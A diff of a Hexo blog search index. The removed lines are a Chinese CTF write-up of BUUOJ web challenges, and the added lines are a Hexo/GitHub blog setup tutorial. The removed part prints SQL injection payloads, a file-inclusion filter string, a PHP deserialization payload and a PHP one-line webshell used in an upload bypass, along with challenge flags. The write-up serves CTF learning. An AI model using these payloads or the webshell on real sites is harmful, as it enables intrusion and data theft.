@@ -1,137 +1,168 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BUUOJ-Web</title>
-    <url>/2021/03/11/WriteUp/BUUOJ%20web/</url>
-    <content><![CDATA[<p>BUUOJ-Web WriteUp</p>
-<a id="more"></a>
-<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单的sql注入</p>
-<p>这里是payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
-<p>可以登陆进去之后直接看到flag</p>
-<p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p>
+    <title>github+hexo搭建个人博客教程</title>
+    <url>/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul>
+<li>环境搭建<ul>
+<li>安装node.js</li>
+<li>安装git</li>
+<li>安装Hexo</li>
+</ul>
+</li>
+<li>github仓库的创建</li>
+<li>githubSSH的配置</li>
+<li>sublime的安装使用</li>
+<li>Hexo与github连接</li>
+<li>Hexo的主题切换<a id="more"></a>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2></li>
+<li>安装node.js之前请先安装npm并了解相关知识</li>
+</ul>
+<p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p>
+<p>检查node.js是否安装成功，win+r打开命令窗口，输入node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js 检测"><br>出现版本号即安装成功</p>
+<p>检查npm是否安装成功，在命令窗口下，输入npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm 检测"><br>出现版本号即安装成功</p>
+<p>好啦，到这里Hexo的环境已经搭建完毕了</p>
+<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h3 id="1、git下载"><a href="#1、git下载" class="headerlink" title="1、git下载"></a>1、git下载</h3><p>git的下载可以去官网下载<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/download，但是会有点慢。</a><br>觉得慢的可以去这个网址下载链接：<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> 提取码：qivu </p>
+<h3 id="2、git安装"><a href="#2、git安装" class="headerlink" title="2、git安装"></a>2、git安装</h3><p>1、下载完后双击安装程序Git-2.30.0-64-bit，进入安装界面，点击next：<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、选择安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、安装配置窗口，包括git命令行、git图形界面等：<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、选择开始菜单文件：<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5、选择git的默认编译器，推荐vim：<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6、选择仓库的初始名称，选默认就好了：<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7、选择可以用windows命令行操作，也可用git bash操作：<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8、HTTPS传输后台，用默认的就行了：<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9、选择换行符，默认unix格式，如果检测到windows格式则自动转换为unix格式：<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10、选择配置默认终端：<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11、选择git pull风格，推荐默认：<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12、选择凭据管理，推荐默认选项：<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13、配置额外的选项，选择文件缓存：<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14、这是新功能，不推荐选择：<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15、安装中：<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16、安装成功辣：<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17、在任意文件夹中，右键即可选择<br>Git GUI为git图形界面工具<br>Git Bash为命令行工具<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p>
+<h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Hexo安装-1"><a href="#Hexo安装-1" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><p>hexo是我们以后用于搭建个人博客的框架，所以最好先新建一个blog文件夹用于博客的管理，且hexo框架与以后写作发布的网页都会保存在这个文件夹当中。<br>创建好之后，打开命令行，切换至创建的文件夹中：<br><img src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>使用npm命令安装hexo，输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+<p>耐心等待安装完成，安装完成之后，先初始化我们的博客，输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure>
+<p>tips：这些命令必须在我们创建的文件夹中使用。</p>
+<p>此时我们检查一下我们网站的雏形，按顺序输入以下三条命令：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo		<span class="comment">//新建一篇名为“hello Hexo”的博客</span></span><br><span class="line">hexo g					<span class="comment">//生成静态文件</span></span><br><span class="line">hexo s					<span class="comment">//本地部署预览</span></span><br></pre></td></tr></table></figure>
+<p>到这里我们的网站已经初步成型了，可以输入localhost:4000进行访问。</p>
+<h3 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h3><h4 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo -g	<span class="comment">//安装hexo</span></span><br><span class="line">npm update hexo -g	<span class="comment">//更新hexo</span></span><br><span class="line">hexo init	<span class="comment">//初始化博客</span></span><br></pre></td></tr></table></figure>
+<h4 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&quot;博客名称&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;博客名称&quot;</span>	<span class="comment">//新建一篇博客</span></span><br><span class="line">hexo g = hexo generate	<span class="comment">//生成</span></span><br><span class="line">hexo s = hexo server	<span class="comment">//启动服务器</span></span><br><span class="line">hexo d = hexo deploy	<span class="comment">//部署</span></span><br></pre></td></tr></table></figure>
+<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo server	<span class="comment">//hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s	<span class="comment">//静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span>	<span class="comment">//更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>	<span class="comment">//自定义 IP地址</span></span><br><span class="line">hexo clean	<span class="comment">//清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure>
+<h1 id="github仓库的创建"><a href="#github仓库的创建" class="headerlink" title="github仓库的创建"></a>github仓库的创建</h1><p>好了，到这里确保上方操作无误即可进行github仓库的创建(但首先你得先有个github账号哦)。<br>进入github主页，选择左上角的new：<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>进入后输入仓库名称，必须要与owner下的名称一致，输入完后点击创建即可<br>我已经创建过仓库了，所以会提示<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
+<p>进入git bash中，按顺序输入如下代码：</p>
 <blockquote>
-<p>flag{2c793226-369d-4941-af62-10463af21b6c}</p>
+<p>git config –global user.email “<a href="mailto:&#120;&#x78;&#x78;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">&#120;&#x78;&#x78;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;</a>“    //填写注册github的邮箱</p>
 </blockquote>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>尝试了各种姿势后发现可以用堆叠注入</p>
-<p>爆库名</p>
 <blockquote>
-<p>1’;show databases;#</p>
+<p>git config –global user.name “xxxx”    //github 用户名</p>
 </blockquote>
-<p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p>
-<p>爆表名</p>
 <blockquote>
-<p>1’;show tables;#</p>
+<p>ssh-keygen    //输入完这个就一致enter就行了</p>
 </blockquote>
-<p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p>
-<p>爆列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #爆1919810931114514表</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #爆words表</span><br></pre></td></tr></table></figure>
-<p>发现id在words表中，那么咱只需要改个表名就行了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # 把表words更名为words1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # 把表1919810931114514更名为words</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # 把words中的列名flag更名为id</span><br></pre></td></tr></table></figure>
-<p>然后只要登入就可以看到flag了</p>
-<blockquote>
-<p>1’ or 1=1 #</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开看见一只可爱的小猫</p>
-<p>直接进入ctrl + U看源代码，在下面发现藏东西了</p>
-<p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p>
-<p>按着GET一个cat变量，出现flag</p>
-<p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p>
-<blockquote>
-<p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>ctrl+U发现一个Archive_room.php</p>
-<p>用burpsuite抓一下包，发现一个secr3t.php</p>
-<p><img src="https://i.loli.net/2021/03/13/2pXDMTH8ZsvziE4.png"></p>
-<p>发现是一段简单的代码审计和文件包含</p>
-<p>咱可以用伪协议</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/03/13/gCqDYKie7H3RVP2.png"></p>
-<p>得到一串base64编码，解码即可得到flag</p>
-<blockquote>
-<p>flag{d67ab513-7a2d-4e45-a27a-99486f6f99ee}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>进去后发现是简单的sql注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,3 # # 查看回显</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 # #爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;),3 # # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(concat_ws(0x7e, username, password)) from l0ve1ysq1),3 # #爆数据</span><br></pre></td></tr></table></figure>
-<p>最后得到flag</p>
-<blockquote>
-<p>flag{94e175f4-807f-404e-a433-65501ae8595b}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>这题提示已经POST了一个一句话木马</p>
-<p>直接用蚁剑连接</p>
-<p><img src="https://i.loli.net/2021/03/13/KYiDsjup9zoFG7b.png"></p>
-<p>  得到flag</p>
-<blockquote>
-<p>flag{46dce079-289a-4494-98da-139ce0e08a9a}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p> ctrl+U发现一个secret.php</p>
-<p>进入后依照提示逐一添加header</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>
-<p>即可得到flag</p>
-<blockquote>
-<p>flag{da768d87-8706-4596-bf42-71c1b8fa6453}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>有提示可以知道有网站备份文件</p>
-<p>运用脚本进行扫描</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://bb232cbc-9635-4f1f-bbdb-d01f82b431ee.node3.buuoj.cn/&#x27;</span>		<span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure>
-<p>得到一个<a href="http://www.zip/">www.zip</a></p>
-<p>发现是一道php反序列化绕过，这里简化了一下代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>根据代码构造payload</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p>然后用python提交get，成功得到flag（虽然不知道为啥Hackbar提交没反应</p>
-<blockquote>
-<p>flag{361e4af6-f242-4f37-888e-17491b76ecd2}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>进入发现需要上传文件，构造一个一句话木马扔上去</p>
-<p>用burpsuites抓包改一下文件类型</p>
-<p>然后提示不能包含&lt;?字符，去度娘搜了一下之后发现可以在文件头部加上**GIF89a?**绕过这个点</p>
-<p>然后又提示不能用php类型文件</p>
-<p>一番查找了之后发现了一个.phtml类型</p>
-<p>重新构造了一下木马</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;rossweisse&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>用菜刀链接即可得到flag</p>
-<blockquote>
-<p>flag{43921141-5d8f-4c88-b07c-55b0801220ca}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题也是一道sql注入题</p>
-<p>按照原来的套路试了几次之后发现把关键字都ban了</p>
-<p>那么我们可双写关键字来进行绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; ununionion seselectlect 1,group_concat(table_name),3  frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23 #爆表名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(column_name),3  frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;database() aandnd table_name&#x3D;&#39;b4bsql&#39; %23 #爆列名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(concat_ws(0x7e,username,passwoorrd)),3  frfromom b4bsql %23 #爆数据</span><br></pre></td></tr></table></figure>
-<p>拿到flag</p>
-<blockquote>
-<p>flag{cbf6aeea-a401-4c47-b000-c373eaef6289}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题进来之后发现只有一个payflag页面可以进</p>
-<p>进入之后ctrl+U在下面发现了一串代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<p>可以得知咱要以POST方式发送一个不是数字并且要等于404的password变量和money变量</p>
-<p>发现burpsuite重发之后会出现一句<strong>Only Cuit’s students can buy the FLAG</strong></p>
-<p>这里咱重新查看下抓的包，发现了一个user参数，令user=1</p>
-<p>发送出去之后前两个都正确了，但是还是出现了一句<strong>Nember lenth is too long</strong></p>
-<p>那只能是money参数出现了问题，将money=100000000改为money=1e9即可得到flag</p>
-<p><img src="https://i.loli.net/2021/03/14/LSq3PIr8Q2TlzcO.png"></p>
-<blockquote>
-<p>flag{68ff87f9-0c7f-4c49-b057-2af8e9ea3ed3}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题sql注入惯例试了下<strong>1’ or 1=1 %23</strong></p>
-<p>结果很友善的回了一句臭弟弟</p>
-<p>之后试了一下其他的发现把空格等一些字符还有union给ban了，于是就想到了报错注入</p>
-<p><strong>1’or(updatexml(1,concat_ws((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆表名</strong><br><strong>1’or(updatexml(1,concat_ws((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆列名</strong><br><strong>1’or(updatexml(1,concat_ws((select(concat_ws(0x7e,username,password))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆数据</strong>（结果发现只有一半，后面查到了一个right()</p>
-<p><strong>1’or(updatexml(1,concat_ws((select(right(group_concat(password),20))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆后边的flag</strong>（这里要注意flag的连接，不是对半开的</p>
-<p>这里是flag</p>
-<blockquote>
-<p>flag{16f2507c-b985-4744-9b3b-8f02007f0c29}</p>
-</blockquote>
+<p>然后进入用户目录下的.ssh，打开id_rsa.pub，复制里面的内容。</p>
+<p>进入github，新建一个SSH就可以了：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="sublime的安装使用"><a href="#sublime的安装使用" class="headerlink" title="sublime的安装使用"></a>sublime的安装使用</h1><p>sublime是一个好用的文本编辑器。</p>
+<p>1、sublime下载<br>可以去官网下载：<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>也可以云盘下载：<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> 提取码：42pf </p>
